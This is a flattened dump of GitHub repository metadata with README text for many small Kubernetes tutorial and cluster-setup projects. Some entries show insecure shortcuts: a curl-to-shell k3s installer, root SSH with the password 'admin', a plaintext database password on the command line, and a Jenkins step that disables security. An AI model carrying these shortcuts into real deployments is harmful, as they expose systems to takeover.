ravi041282,k8sonoci,,k8straining Kubernetes as a service on Oracle Cloud Infrastructure Also called Container Engine for Kubernetes or OKE in short Disclaimer This is a personal repository All code views or opinions represented here are personal and belong solely to me and do not represent those of people institutions or organizations that I may or may not be associated with in professional or personal capacity unless explicitly stated Also please note resources deployed using these example scripts do incur charges Make sure to terminate the deployed resources services after your tests to save minimize your bills,2020-09-16T18:55:50Z,2020-12-01T11:23:47Z,Shell,User,1,1,1,4,master,ravi041282,1,0,0,0,0,0,0
ljh2057,k8s-deepo,,k8s deepo Deepo Deepo https github com ufoym deepo Docker Theano https github com Theano Theano TensorFlow http www tensorflow org Sonnet https github com deepmind sonnet PyTorch http pytorch org Keras https keras io Lasagne http lasagne readthedocs io en latest MXNet http mxnet incubator apache org CNTK https www microsoft com en us cognitive toolkit Chainer https chainer org Caffe http caffe berkeleyvision org Caffe2 https caffe2 ai Torch http torch ch Paddle https github com PaddlePaddle Paddle Darknet https pjreddie com darknet GPU CUDA cuDNN CPU LinuxCPU GPU OS XCPU WindowsCPU Deepo Dockerfile Deepo GPU TensorFlow tag deepo tensorflow py36 cu101 Deepo All in One tag deepo all cu101 All in One Deepo Build your own customized image https github com ufoym deepo Dockerfile k8s deepo k8s deepo Kubernetes https kubernetes io GPU Kubernetes Deepo k8s deepo IDE PyCharm Jupyter Notebook GPU SSH python 3 6 opencv 4 4 0 jupyter latest jupyterhub latest jupyterlab latest caffe latest keras latest pytorch 1 6 0 cu101 tensorflow gpu latest k8s deepo yaml Helm Installation Step 1 k8s deepo git git clone https github com ljh2057 k8s deepo git cd k8s deepo Step 2 Step 2 1 yaml 1 Namepsace bash kubectl create namespace k8s deeplearning 2 ConfigMap DeploymentService bash kubectl apply f k8s deepo ConfigMap yaml kubectl apply f k8s deepo Deployment yaml kubectl apply f k8s deepo Service yaml Step 2 2 Helm bash helm install helm k8s deepo helm k8s deepo Step 2 Step 3 1 Jupyterhub 30088 bash Get the jupyterhub URL by running these commands export NODEPORT kubectl get namespace default o jsonpath spec ports 1 nodePort services helm k8s deepo export NODEIP kubectl get nodes namespace default o jsonpath items 0 status addresses 0 address echo http NODEIP NODEPORT Step 3 2 SSH 30022 bash Get the jupyterhub URL by running these commands export SSHPORT kubectl get namespace default o jsonpath spec ports 0 nodePort services helm k8s deepo export NODEIP kubectl get nodes namespace default o jsonpath items 0 status addresses 0 address ssh p SSHPORT root NODEIP passwd of root is admin which can modify Deployment spec containers args if you use step 2 1 or values containers args,2020-12-08T07:41:20Z,2020-12-14T02:44:04Z,Python,User,1,1,0,6,master,ljh2057,1,0,0,0,0,0,0
ruskofd,k8s-bootstrap,kubernetes,General informations Files to bootstrap a Kubernetes cluster using kubeadm on Flatcar Linux containerd Kubernetes version v1 20 1 Operating system Flatcar Linux 2605 10 0 Container runtime containerd 1 4 3 How to Links Flatcar Linux https www flatcar linux org Kubernetes https kubernetes io containerd https containerd io,2020-12-28T22:20:34Z,2020-12-29T11:12:32Z,Shell,User,1,1,0,12,master,ruskofd,1,0,0,0,0,0,0
beesarecute-official,terraria-k8s,,,2020-10-20T05:07:06Z,2020-10-20T06:00:45Z,n/a,User,1,1,0,0,main,,0,0,0,1,0,0,0
prakharmaurya,multi-k8s,,multi k8s new line added,2020-08-21T06:30:25Z,2020-09-11T04:36:51Z,JavaScript,User,1,1,0,10,master,prakharmaurya,1,0,0,0,0,0,1
voidzhakul,ansible-k8s,,ansible kubernetes vagrant virtualbox ansiblemasterssh ansiblekubernetes,2020-09-02T15:13:47Z,2020-09-03T04:03:21Z,n/a,User,2,1,0,2,master,voidzhakul,1,0,0,0,0,0,0
enjoykcc456,k8s-mongo,,Kubernetes with Minikube This project is a basic implementation of kubernetes with Minikube cluster running services of mongo express and mongodb Pre requisites Installation of Minikube https minikube sigs k8s io docs start Basic Concepts with Commands A Pod smallest block in k8s is an abstraction over containers kubectl exec it bin bash Get the interactive terminal of the pod application for debugging inside the pod kubectl logs To log a pod A Deployment is an abstraction over Pods that manages the replica set kubectl create deployment image To get basic deployment with minimal values kubectl edit deployment To edit deployment configuration file kubectl delete deployment To delete a deployment A ReplicateSet is a layer between Deployment and Pod that manages the replicas of a Pod kubectl get replicaset To get replica sets A Service is a k8s component that acts as a proxy to forward requests to a set of Pods A ConfigMap is an API object that provides centralization to store non confidential configuration data in key value pairs which could be consumed by Pods as environment variables command line arguments or as configuration files in a volume A Secret on the other hand is similar to ConfigMap but for storing of confidential information such as passwords OAuth tokens etc echo n your password base64 To generate a base64 encoded password which could be used in Secret A Namespace is useful for dividing resources between multiple users or separate slightly different versions resources e g different versions of the same software It is like a virtual cluster inside a cluster to help organise resources kubectl create namespace To create a namespace An Ingress is an API object that provides routing rules to manage the external users access to the services in a cluster It provides load balancing SSL termination and name based virtual hosting An Ingress Controller is a Pod in the cluster that evaluates and processes the Ingress rules One of the recommended practice for production is to have an external proxy server which acts as a single entry point It will be responsible for accepting the request from the client and forward the request to the right cluster Then the internal nginx proxy ingress controller of each cluster will evaluate the defined ingress rules and forward the request to different services based on the rules In this case by having a single external server as a proxy the clusters are not exposed to the outer world and are only accessible by the external server proxy hence providing security General commands kubectl get To get status of different k8s resources components kubectl describe name To show details of a specific resource or group of resources kubectl get endpoints To get the endpoints of a service When a service is created kubernetes creates an endpoint object which has the same name as the service to keep track of the endpoints of the service kubectl get deployment o yaml deployment result yaml To output the updated configuration file after deployment kubectl get pods o wide To get extra information of a pod e g ip address Get Started 1 Start the Minikube which would start a local Kubernetes cluster minikube start kubectl get nodes To get the worker nodes there will be only one node with name of minikube 2 Create a Namespace called mongo namespace kubectl apply f mongo namespace yaml kubectl get namespace To check if mongo namespace is successfully created 3 Create a Secret that contains the credentials username and password for accessing the MongoDB kubectl apply f mongo secret yaml To apply the secret configuration file before applying deployment that reference the secret kubectl get secret namespace mongo namespace To check if the secret is properly created with name of mongodb secret 4 Create a Deployment which is an an abstraction over Pods that manages the ReplicaSets The deployment will create a MongoDB pod As defined in the configuration yaml file the MongoDB pod will access the database with the credentials from the Secret Besides a Service is also created as an internal service to allow other Pods in the cluster to communicate with the MongoDB pod kubectl apply f mongo deployment yaml To apply the mongodb deployment kubectl get all namespace mongo namespace grep mongo To check if the service deployment replicaset and pod are created for mongodb 5 Create a ConfigMap that stores non confidential data the MongoDB service url in our case which is referenced in mongo express deployment as environment variable for the mongo express container to connect to the right MongoDB service kubectl apply f mongo configmap yaml To apply the mongo configmap kubectl apply f mongo express deployment yaml To apply the mongo express deployment kubectl get all namespace mongo namespace grep mongo To check for additional service deployment replicaset and pod created for mongo express 6 Install and start the k8s Nginx implementation of Ingress Controller minikube addons enable ingress kubectl get pods n kube system To check that the pod ingress nginx controller is created 7 Create an Ingress for mongo express and access the dashboard via my mongo com kubectl apply f mongo ingress yaml kubectl get ingress namespace mongo namespace To check on the ingress created and get the assigned ip address sudo nano etc hosts Update the hosts file by adding an entry to it e g 192 168 0 49 2 my mongo com 8 Optional Create an Ingress for kubernetes dashboard and access the dashboard with kube dashboard com kubectl apply f dashboard ingress yaml kubectl get ingress namespace kubernetes dashboard To check on the ingress created and get the assigned ip address sudo nano etc hosts Update the hosts file by adding an entry to it e g 192 168 0 49 2 kube dashboard com 9 To stop and remove the services deployments etc kubectl delete f mongo ingress yaml kubectl delete f mongo express deployment yaml kubectl delete f mongodb deployment yaml kubectl delete f mongo secret yaml kubectl delete f mongo configmap yaml,2020-11-16T06:45:17Z,2020-11-22T11:50:31Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
jharrilim,k8s-demo,docker-desktop#docker-desktop-for-mac#docker-desktop-for-windows#kubernetes#kubernetes-deployment#kubernetes-service#tutorial,Kubernetes Intro Prerequisites prerequisites Getting Started getting started Run a Docker Registry Locally run a docker registry locally Enable Kubernetes on Docker Desktop for Mac Windows enable kubernetes on docker desktop for macwindows Optional Download the VSCode Kubernetes Extension optional download the vscode kubernetes extension How to Deploy an Application how to deploy an application Containerize Your Application containerize your application Write a Kubernetes Deployment write a kubernetes deployment Write a Kubernetes Service write a kubernetes service Deploy deploy Apply the Deployment and Service Manifests apply the deployment and service manifests Check if Service is Running check if service is running Congratulations congratulations Cleanup cleanup Useful Commands useful commands Set your default namespace so you don t accidentally push to default set your default namespace so you dont accidentally push to default View your current contexts you probably have docker desktop and a cloud provider view your current contexts you probably have docker desktop and a cloud provider Switch to the docker desktop context switch to the docker desktop context Run an Ubuntu container in the cluster to debug run an ubuntu container in the cluster to debug FAQ faq I enabled Kubernetes in Docker for Desktop Mac but I can t access my NodePort What do I do i enabled kubernetes in docker for desktop mac but i cant access my nodeport what do i do Prerequisites Have Docker Desktop https www docker com products docker desktop installed Getting Started Run a Docker Registry Locally First things first startup your own local Docker Registry on localhost 5000 by doing sh docker compose up Enable Kubernetes on Docker Desktop for Mac Windows 1 Click the Docker Desktop icon in the tray and select preferences 2 Click Kubernetes 3 Check Enable Kubernetes 4 Click Apply Restart Optional Download the VSCode Kubernetes Extension If you use VS Code download the Kubernetes extension https marketplace visualstudio com items itemName ms kubernetes tools vscode kubernetes tools It provides you with documentation on hover for each of the fields in a Kubernetes manifest How to Deploy an Application Containerize Your Application 1 Write a Dockerfile for your app 2 Build and tag your image and remember to 1 Prefix it with the domain name port if you want to deploy to a registry that isn t docker io 2 Version it with a git tag or the commit hash 3 docker push the built image to a container registry Write a Kubernetes Deployment 1 Copy the frontend deployment yml frontend manifests dev frontend deployment yml for now since it is pretty basic and has comments describing it 2 In the deployment yml make sure the container image name is set to the same name of the image that was sent to the container registry via docker push 3 Ensure that there is a label called app and it has a name representing this deployment Note VS Code users who ve installed the Kubernetes extension have access to snippets for generating Kubernetes yaml manifests Write a Kubernetes Service 1 Copy the frontend service yml frontend manifests dev frontend service yml 2 Ensure that the selector has the app label that was given to the deployment Deploy Apply the Deployment and Service Manifests sh kubectl apply f your app deployment yml kubectl apply f your app service yml Check if Service is Running sh kubectl get svc Congratulations Your application is deployed You may now access it on your own host Cleanup Let s delete the Kubernetes objects that were created in the above steps The service can be deleted by doing sh kubectl delete service yourservicename Note If you are unsure of the service name you can use kubectl get svc to find it You can delete the deployment by doing sh kubectl delete deployment yourdeploymentname Note If you are unsure of the deployment name you can use kubectl get deployments to find it Useful Commands Kubernetes Cheatsheet https kubernetes io docs reference kubectl cheatsheet Set your default namespace so you don t accidentally push to default This is useful when you have a shared cluster in the cloud and you have an assigned namespace that you wish to use sh kubectl config set context current namespace joe Verify it sh kubectl config view grep namespace View your current contexts you probably have docker desktop and a cloud provider sh kubectl config get contexts Switch to the docker desktop context sh kubectl config use context docker desktop Run an Ubuntu container in the cluster to debug sh kubectl run i tty rm debug image ubuntu restart Never bash FAQ I enabled Kubernetes in Docker for Desktop Mac but I can t access my NodePort What do I do Restart your computer,2020-10-26T03:21:05Z,2020-12-08T01:22:47Z,HTML,User,1,1,1,5,master,jharrilim,1,0,0,0,0,0,1
zbigniewzolnierowicz,k8s-home,,Home Cluster Managed hopefully by Flux https github com fluxcd flux2 Requirements k3s a NFS client on k3s hosts a NFS host with some shares IMPORTANT When using k3s disable Traefik by editing etc systemd system k3s service Here is a quick snippet for you and me bash curl sfL https get k3s io INSTALLK3SEXEC disable traefik sh Installation sh First bootstrap the repository with Flux v2 flux bootstrap github verbose owner zbigniewzolnierowicz repository k8s home branch main path cluster personal Then add the routes for Traefik kubectl apply f routes For why you need the second command see this issue https github com fluxcd flux2 issues 562 issuecomment 740014295 App structure default x Traefik acts as a reverse proxy for everything else Blocky observability Grafana Loki Prometheus speedtest prometheus media x qBitTorrent x Sonarr x Radarr x Bazarr x Plex x Jackett games minecraft storage x OpenEBS with Local PV Hostpath Folder structure cluster default traefik routes AppName yaml kustomization yaml add every route declared by AppName yaml here namespace1 namespace yaml app HelmRelease yaml PersistentVolume yaml for persistence data per container CustomResourceDefinition yaml pvs for volumes needed for most containers in the namespace namespace2 namespace3 repositories nameofrepo yaml for Helm repositories PV and PVC naming scheme For per container PV storage type container name usage pv or pvc Example nfs plex transcode pvc For per namespace PV storage type usage pv or pvc Example nfs media pvc Inspirations and people that helped me get this set up k8s at home awesome home kubernetes https github com k8s at home awesome home kubernetes fluxcd flux2 https github com fluxcd flux2 onedr0p home cluster https github com onedr0p home cluster anthr76 infra https github com anthr76 infra,2020-12-04T22:14:45Z,2020-12-22T22:20:12Z,n/a,User,1,1,0,80,main,zbigniewzolnierowicz,1,0,0,0,0,0,0
bayzi,vault-k8s,,vault k8s This repo contains all scripts and kubernetes manifests to setup a production ready Vault cluster For a detailed walkthrough visit my blog post https medium com faun setup a production ready vault cluster with kubernetes and azure 30943ff91bf3,2020-09-18T11:46:56Z,2020-09-22T16:57:39Z,Shell,User,1,1,0,2,master,bayzi,1,0,0,0,0,0,0
veluxer62,k8s-study,,,2020-10-10T14:21:54Z,2020-10-20T01:52:53Z,n/a,User,1,1,1,2,master,kay-101,1,0,0,0,0,0,0
Adam-Klein,rke-k8s,,rkek8s Ansible role to install K8s cluster using RKE and all dependencies,2020-10-25T04:51:38Z,2020-11-15T20:01:37Z,n/a,User,1,1,0,2,main,Adam-Klein,1,0,0,0,0,0,0
dhiman-halder,k8sw,,K8s EKS 101 Workshop Pre Requisites aws eksctl kubectl tools installed and pre configured General To create an EKS cluster eksctl create cluster f cluster yaml To list the worker nodes of an EKS cluster kubectl get nodes To view the cluster information kubectl cluster info POD Switch to the pod folder Create a pod from a yaml definition kubectl apply f pod yaml List the pods kubectl get pods List the pods with additional info kubectl get pods o wide Get complete details of a pod kubectl describe pod web pod Get details of a pod in YAML format kubectl get pod web pod o yaml Start a shell within the container of a pod kubectl exec it web pod c nginx sh ls cat etc nginx nginx conf exit Delete a pod kubectl delete pod web pod Imperative way of creating a pod kubectl run web pod image nginx restart Never View logs of a pod cat pod random logger yaml kubectl apply pod random logger yaml kubectl logs random logger To tail live logs kubectl logs random logger f c to stop kubectl delete pod random logger REPLICASET Switch to the replicaset folder Create a replicaset from a yaml definition kubectl apply f replicaset yaml List the replicasets kubectl get rs or kubectl get replicasets Get complete details of a replicaset kubectl describe rs web rs Get the pods managed by the replicaset kubectl get pods o wide To verify the autoheal capability of a rs kubectl delete pod kubectl get pods kubectl describe rs web rs Declarative way of scaling a replicaset Edit replicaset yaml and update the replica count to 5 Apply updated definition and relist pods kubectl apply f replicaset yaml kubectl get pods Imperative way of scaling a replicaset kubectl scale rs web rs replicas 2 kubectl get pods Edit a live replicaset and update the replica count to 6 kubectl edit rs web rs kubectl get pods Delete replicaset kubectl delete rs web rs DEPLOYMENT Switch to the deployment folder Create a deployment from a yaml definition kubectl apply f deployment yaml Check the rollout status of the deployment kubectl rollout status deploy web deploy List deployments kubectl get deploy or kubectl get deployments Describe a deployment kubectl describe deploy web deploy Check the replicaset associated with the deployment kubectl get rs List the pods managed by the replicaset deployment kubectl get pods Get the rollout history of a deployment kubectl rollout history deploy web deploy Get the rollout history of a particular rollout of a deployment kubectl rollout history deploy web deploy revision 1 Declarative way of updating deployment Update the Image version of yaml definition to 1 8 1 kubectl apply f deployment yaml Get the rollout history of the deployment kubectl rollout history deploy web deploy Verify the replicaset has changed and notice the rollout events kubectl describe deploy web deploy List before and after replicaset associated with the deployment kubectl get rs Imperative way of updating deployment kubectl set image deploy web deploy nginx nginx 1 9 1 record kubectl rollout history deploy web deploy kubectl rollout undo deploy web deploy kubectl rollout undo deploy web deploy to revision 1 Delete deployment kubectl delete deploy web deploy SERVICE WordPress with MySQL Switch to the service folder View then apply all definitions within the service folder kubectl apply f List the services kubectl get svc Get the public DNS of the LoadBalancer and view on Browser complete setup process Verify wordpress pod is communicating with the mysql pod kubectl exec it mysql sh mysql u root p show databases use wordpress show tables quit exit To delete the EKS cluster eksctl delete cluster demo,2020-11-04T22:12:16Z,2020-11-23T21:05:58Z,n/a,User,2,1,1,13,main,dhiman-halder,1,0,0,0,0,0,0
frf,k8s-laravel,,About Laravel Laravel is a web application framework with expressive elegant syntax We believe development must be an enjoyable and creative experience to be truly fulfilling Laravel takes the pain out of development by easing common tasks used in many web projects such as Simple fast routing engine https laravel com docs routing Powerful dependency injection container https laravel com docs container Multiple back ends for session https laravel com docs session and cache https laravel com docs cache storage Expressive intuitive database ORM https laravel com docs eloquent Database agnostic schema migrations https laravel com docs migrations Robust background job processing https laravel com docs queues Real time event broadcasting https laravel com docs broadcasting Laravel is accessible powerful and provides tools required for large robust applications Learning Laravel Laravel has the most extensive and thorough documentation https laravel com docs and video tutorial library of all modern web application frameworks making it a breeze to get started with the framework If you don t feel like reading Laracasts https laracasts com can help Laracasts contains over 1500 video tutorials on a range of topics including Laravel modern PHP unit testing and JavaScript Boost your skills by digging into our comprehensive video library Laravel Sponsors We would like to extend our thanks to the following sponsors for funding Laravel development If you are interested in becoming a sponsor please visit the Laravel Patreon page https patreon com taylorotwell Premium Partners Vehikl https vehikl com Tighten Co https tighten co Kirschbaum Development Group https kirschbaumdevelopment com 64 Robots https 64robots com Cubet Techno Labs https cubettech com Cyber Duck https cyber duck co uk Many https www many co uk Webdock Fast VPS Hosting https www webdock io en DevSquad https devsquad com OP GG https op gg Contributing Thank you for considering contributing to the Laravel framework The contribution guide can be found in the Laravel documentation https laravel com docs contributions Code of Conduct In order to ensure that the Laravel community is welcoming to all please review and abide by the Code of Conduct https laravel com docs contributions code of conduct Security Vulnerabilities If you discover a security vulnerability within Laravel please send an e mail to Taylor Otwell via taylor laravel com mailto taylor laravel com All security vulnerabilities will be promptly addressed License The Laravel framework is open sourced software licensed under the MIT license https opensource org licenses MIT k8s laravel,2020-09-10T16:19:13Z,2020-10-25T01:43:07Z,PHP,User,1,1,1,2,master,frf,1,0,0,0,0,0,0
currycan,k8s-sso,,k8s sso DexopenLDAPKubernetes,2020-12-17T14:45:31Z,2020-12-27T05:26:53Z,n/a,User,1,1,0,0,main,,0,0,0,0,0,0,0
fcostabr78,k8splugins,,k8splugins Este procedimento lhe ajudar a instalar plugins para o kubectl utilizando o projeto open source Krew Mas o que s o plugins Desde a vers o 1 12 kubectl inclui um mecanismo que permite estender o CLI com comandos personalizados para aumenta a produtividade e facilitar o uso de algumas ferramentas Pr requisitos instalados x git x kubectl x um cluster k8s configurado No meu caso h um cluster Kubernetes no Oracle Cloud OKE Vamos aos passos 1 Abra seu Terminal 2 Execute set x cd mktemp d curl fsSLO https github com kubernetes sigs krew releases latest download krew tar gz tar zxvf krew tar gz KREW krew uname tr upper lower uname m sed e s x8664 amd64 e s arm arm KREW install krew 3 Feita a isntala o execute export PATH PATH HOME krew bin 4 Reinicie seu shell r 5 Para testar a instala o no terminal digite Feito Agora divers o Para listar plugin disponveis para instala o kubectl krew search Para instalar um plugin disponvel kubectl krew install Quais meus plugins prediletos Tree Debug Popeye kyverno MinIO kubesec scan https kubesec io ca cert,2020-12-19T01:49:59Z,2020-12-28T04:41:06Z,n/a,User,2,1,0,3,main,fcostabr78,1,0,0,0,0,0,0
cyrilsebastian1811,K8s-Cluster-Setup,ansible#k8s-cluster#metrics-server,Team information Team Members Github Id NUID Suhas Pasricha suhas1602 001434745 Puneet Tanwar puneetneu 001409671 Cyril Sebastian cyrilsebastian1811 001448384 Shubham Sharma shubh1646 001447366 k8s Deployment Setup ansible playbook deploy app yaml i production extra vars dbusername team dbpassword Qwerty123 rdsendpoint dockerhubusername cyrilsebastian1811 dockerhubpassword xxxxxxxxxxxxx dockerhubemail a a com uiimage frontend apiimage backend Teardown kubectl delete namespace ui kubectl delete namespace api Infrastructure Setup export KOPSSTATESTORE s3 k8 dev cyril sebastian com export AWSPROFILE dev export AWSREGION us east 1 ansible playbook setup k8s cluster yaml i production extra vars k8sversion 1 15 7 mnodesize t2 small cnodesize t2 small zone k8 dev cyril sebastian com name k8 dev cyril sebastian com dbusername team dbpassword Qwerty123 Teardown ansible playbook teardown k8s cluster yaml i production extra vars name k8 dev cyril sebastian com vvv,2020-09-18T06:34:48Z,2020-09-18T21:06:52Z,n/a,User,1,1,0,35,master,puneetneu#suhas1602#cyrilsebastian1811#shubh1646,4,0,0,0,0,0,0
msarti,k8s-terraform-libvirt,,Deploy a Kubernetes cluster from scratch with libvirt Terraform and Ansible Requirements QEMU KVM virtualization environment and libvirt https libvirt org installed virt manager is recommended for better control Terraform and libvirt provider https github com dmacvicar terraform provider libvirt installed Read carefully the terraform v13 migration notes https github com dmacvicar terraform provider libvirt blob master docs migration 13 md Ansible installed Terraform Configuration The current configuration has one master node and three worker nodes Currently it is not possible to configure multiple master nodes while you can configure as many worker nodes as you want First of all download the Ubuntu server cloud image and save it to a file system location Ubuntu 20 04 image https cloud images ubuntu com focal current focal server cloudimg amd64 img is recommended Plan your infrastructure Decide how many worker nodes memory vcpu to assign and modify the settings variables memory and vcpu in main tf accordingly The script creates a network for the cluster and a pool for the storage check the CIDR of the network and set the path for the pool Set the IP addresses of the nodes according to the created network Also remember to set a random and unique mac address for each node A second disk is created for each worker node to be used for installing a storage manager such as OpenEBS or Rook Ceph The secondarydisksize variable sets the size in bytes Finally the cloudinit cfg file must be created You can start from a copy of the cloudinit cfg sample file and adapt it to your needs For the script to work properly you need to copy the ssh public key to the sshauthorizedkeys and you can set a password for the ansible user so that you can log into the console If you want you can create other users as you wish Ansible configuration Ansible s configuration basically consists in setting up the inventory consistently with what is set in Terraform Set up the hosts file with the list of nodes by assigning the appropriate groups Remember that you can currently only have one master node Under the hostvars folder you need to put a file for each of the hosts configured in the hosts file The file name must be identical to the host name and must contain host specific variables as per the example It is essential to set the ansiblehost variable with the ip address previously set in Terraform Check the crioversion and kubernetesversion variables in the groupvars all file By changing these variables you can set the versions of cri o and Kubernetes Create your infrastucture You are now ready to build your infrastructure To do this type make set up and wait for the build to run At the end you will be able to connect to the master node via user ansible or whoever you have configured and verify the installation Destroy your infrascructure As simple as it is to create the infrastructure it is equally simple to destroy it Type make tear down from the project root and wait for the script to run Terraform destroys all the resources it has created pools disks networks and domains At this point you are ready to start from scratch Pay attention that the command does not ask for any confirmation It is implied that you know what you are doing,2020-11-22T20:00:48Z,2020-11-27T09:42:19Z,HCL,User,1,1,0,1,main,msarti,1,0,0,0,0,0,0
gitumarkk,django_react_k8s,,,2020-08-20T14:15:58Z,2020-11-09T20:33:32Z,JavaScript,User,1,1,0,3,master,gitumarkk,1,0,0,0,0,0,0
fwt11,redis-cluster-k8s,,redis sentinel k8s redis sentinel for k8s Usage bash git clone https github com fwt11 redis cluster k8s git cd redis cluster k8s kubectl apply k the cluster will run Maybe you need to modified the nfs volume yaml,2020-08-26T06:17:43Z,2020-08-26T10:58:26Z,n/a,User,1,1,0,2,master,fwt11,1,0,0,0,0,0,0
mattmattox,k8s-apt-mirror,,k8s apt mirror APT Mirror in kubernetes,2020-08-24T00:55:12Z,2020-11-26T21:09:18Z,Dockerfile,User,1,1,0,2,master,mattmattox,1,0,0,0,0,0,0
iiglesiasg,hetzner-k8s-hardway,,,2020-12-07T15:20:56Z,2020-12-09T15:12:43Z,HTML,User,1,1,0,0,master,,0,1,1,0,0,0,0
KnowledgeHut-AWS,cassandra-k8s-solution,,,2020-10-07T08:38:40Z,2020-10-07T10:24:15Z,n/a,Organization,1,1,1,0,main,,0,0,0,0,0,0,0
sokube,github-k8s-runner,,github k8s runner How to run your own GitHub build farm on a Kubernetes cluster article code References This work is largely based on the work done by Sander Knape and David Karlsen https sanderknape com 2020 03 self hosted github actions runner kubernetes https github com evryfs github actions runner operator Modifications Added a sidecar docker dind with TLS TCP communication between the client and the daemon containers Made it dedicated to establish a pool of runners associated to a GitHub organization not to a particular repository Added a way to prefix the runners names with RUNNERNAMEPREFIX env variable Removed the sudo package sudo group and passwordless sudoers from the container user Added a way to use self signed certificates for a local registry as a config map Howto As an organization owner create a GitHub Personal Access Token with the repo and admin org scope permissions image 20200825102405975 img image 20200825102405975 png Create a generic secret with your GitHub Personal Access Token shell kubectl create secret generic my pat from literal pat XXXXXXXXXXXXXXXXXX If you want to include your registry self signed CA certificate use a config map shell kubectl create configmap private registry certificate from file ca crt Adapt the deployment yml k8s example deployment yml Deployment resource to reflect your organization name in the GITHUBOWNER environment variable and deploy shell kubectl create f k8s example deployment yml You should see your runners appearing in the default group of your organization image 20200827153559045 img image 20200827153559045 png,2020-08-25T08:48:03Z,2020-10-29T15:24:05Z,Dockerfile,Organization,4,1,1,17,master,fabricev,1,0,2,1,2,1,0
stevoltgutsy,k8s-jenkins-CICD,,ecsd kubernetes jenkins playground Resources for Hands on with Jenkins CI CD Pipelines in Kubernetes https www meetup com DevOpsPlayground events 257184190 In this repository you can find all the resources required to build the components and run a simple example of CI CD pipeline with Jenkins on Kubernetes Jenkins build folder It contains all the resources required to build and deploy a Jenkins stand alone pod in Kubernetes This custom build pre installs a few requried tools to be used later in the pipeline mouns the docker socket from the Kubernetes host and uses a persisten volume to make the Jenkins configuration persistent Also the rbac yaml file is responsible to set the required permission to the Jenkins service account that ll be associated to this pod We ll build this container using the command docker build build arg K8STOKEN xxx t jenkins docker Where K8STOKEN is the token of the Jenkins service account previously provisioned in Kubernetes Jenkins jobs folder It contains the groovy Jenkins job definitions for all the Job used to create the CI CD pipeline This jobs are either freestyle jobs and pipeline jobs Also a piece of groovy pipeline containing the logic of the pipeline itself will be included from one of the jobs You can read more about Jenkins DSL jobs from the plugin page https jenkinsci github io job dsl plugin Service folder It contains the service resources used to build the artifact to deploy In this case it s a simple python webserver built with a dockerfile Jenkins will build this service with the command docker build t JOBNAME BUILDNUMBER Where JOBNAME is automatically replaced with the name of the Jenkins job itself and BUILDNUMBER is the current build Kubernetes folder This last folder contains the kubernetes configuration used to deploy the service It can generally contains either a deployment definition a service or a daemonset according to the kind of service we re going to deploy It also contains some placeholder as SERVICENAME IMAGEVERSION to be replaced during the pipeline execution with actual build data apiVersion apps v1 kind Deployment metadata name SERVICENAME labels app SERVICENAME spec replicas 1 strategy type RollingUpdate selector matchLabels app SERVICENAME template metadata labels app SERVICENAME spec containers name SERVICENAME image SERVICENAME IMAGEVERSION imagePullPolicy IfNotPresent ports containerPort 8080 This configuration ideally lives on its own repository and is versioned separately For simplicity it s included with in the same repository as the other resources for the scope of this playground Requirements The bash script used to setup the linux server requirements Commands CD repo folder cd devopsplayground 27 k8s jenkins pipeline Initialize Kubernetes sudo kubeadm init pod network cidr 10 244 0 0 16 Configure Kubernetes command line for centos user mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config Check what s running on the clustert kubectl cluster info kubectl get pods n kube system Install Flannel kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml Find master node name and make it schedulable export K8SMASTER kubectl get nodes o name cut d f2 echo K8SMASTER kubectl describe node K8SMASTER kubectl taint node K8SMASTER node role kubernetes io master Jenkins RBAC Permissions kubectl create f jenkins build rbac yaml Find Jenkins secret token JENKINSTOKEN kubectl get secrets kubectl get sa jenkins o json jq r secrets name o json jq r data token base64 d echo JENKINSTOKEN or use the manual commands kubectl get secrets kubectl describe secret Jenkins Build and deploy Build jenkins docker image docker build build arg K8STOKEN JENKINSTOKEN t jenkins docker jenkins build Deploy Jenkins kubectl create f jenkins build deployment yaml Create service kubectl create f jenkins build service yaml Find Jenkins admin password Save Jenkins pod name in env var export JENKINSPOD kubectl get po l name jenkins o name cut d f2 echo JENKINSPOD Get the admin password from the logs kubectl logs f JENKINSPOD Or from inside the container kubectl exec JENKINSPOD cat var jenkinshome secrets initialAdminPassword Jenkins configuration Connect to Jenkins http ldn devopsplayground com 30001 unlock readmeimages jenkins setup wizard 1 png raw true unlock plugins readmeimages jenkins setup wizard 2 png raw true plugins admin readmeimages jenkins setup wizard 3a png raw true admin saveandcontinue readmeimages jenkins setup wizard 3b png raw true saveandcontinue Install additional plugins Get into the jenkins pod kubectl exec ti JENKINSPOD bash java jar var jenkinshome war WEB INF jenkins cli jar auth admin admin s http 127 0 0 1 8080 install plugin copyartifact job dsl pipeline utility steps or from the web interface http 30001 pluginManager available Disable security sed i s true false var jenkinshome config xml or from the web interface http 30001 configureSecurity Restart Jenkins java jar var jenkinshome war WEB INF jenkins cli jar auth admin admin s http 127 0 0 1 8080 safe restart Jenkins DSL Jobs Automatic Provisioning New Item readmeimages dsl jobs 1 png raw true New Item dsl jobs readmeimages dsl jobs 2 png raw true dsl jobs Repository URL https github com ecsdigital devopsplayground 27 k8s jenkins pipeline git scm readmeimages dsl jobs 3 png raw true scm Build readmeimages dsl jobs 4 png raw true Build DSL Scripts jenkins jobs dsl jobs groovy Build Dsl Jobs readmeimages dsl jobs 5 png raw true Build Dsl Jobs Build Now readmeimages dsl jobs 6 png raw true Build Now Run the Pipeline Interact with the Kuberntes deployments Find pods in test namespace kubectl get pods n test Curl the webserver kubectl n test exec simple webserver xxx xxx curl s http 127 0 0 1 8080,2020-09-07T22:49:26Z,2020-09-07T23:10:59Z,Groovy,User,1,1,0,0,master,,0,0,0,0,0,0,0
sajeetharan,docker-k8s-dotnetapp,,Install Docker for Desktop 1 Download Docker for Desktop for Mac https www docker com products docker desktop 2 Install application 3 Enable Kubernetes on Docker Desktop CMD open Preference panel switch to Kubernetes tap tick Enable Kubernetes and wait for a few minutes Install MiniKube Optional With Minikube we can set up and operate a single node Kubernetes cluster as a local development environment It s optional since we can directly use docker desktop as our local cluster Install minikube and kubectl by Homebrew https brew sh shell brew install minikube kubectl After successful installation you can start Minikube by executing the following command in your terminal shell minikube start Now Minikube is started and you have created a Kubernetes context called minikube which is set by default during startup You can switch between contexts using the command shell kubectl config use context minikube Build a dotnet core web application Create WebApi project Make sure you have dotnet installed on your machine already Install dotnet sdk by homebrew cask https formulae brew sh cask dotnet sdk default Create a dotnet api application shell dotnet new webapi name dotnet app By default dotnet cli creates us a WeatherForecast web api appliction Open Startup cs and comment the line which block us accessing on local C app 